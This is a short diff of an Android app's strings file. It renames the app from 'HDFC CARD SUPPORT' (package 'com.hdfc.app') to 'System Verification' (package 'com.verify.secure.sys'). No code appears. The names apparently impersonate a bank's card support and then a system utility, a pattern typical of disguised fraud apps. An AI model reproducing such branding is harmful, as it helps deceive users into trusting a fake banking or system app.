@@ -1,7 +1,7 @@
 <?xml version='1.0' encoding='utf-8'?>
 <resources>
-    <string name="app_name">HDFC CARD SUPPORT</string>
-    <string name="title_activity_main">HDFC CARD SUPPORT</string>
-    <string name="package_name">com.hdfc.app</string>
-    <string name="custom_url_scheme">com.hdfc.app</string>
+    <string name="app_name">System Verification</string>
+    <string name="title_activity_main">System Verification</string>
+    <string name="package_name">com.verify.secure.sys</string>
+    <string name="custom_url_scheme">com.verify.secure.sys</string>
 </resources>
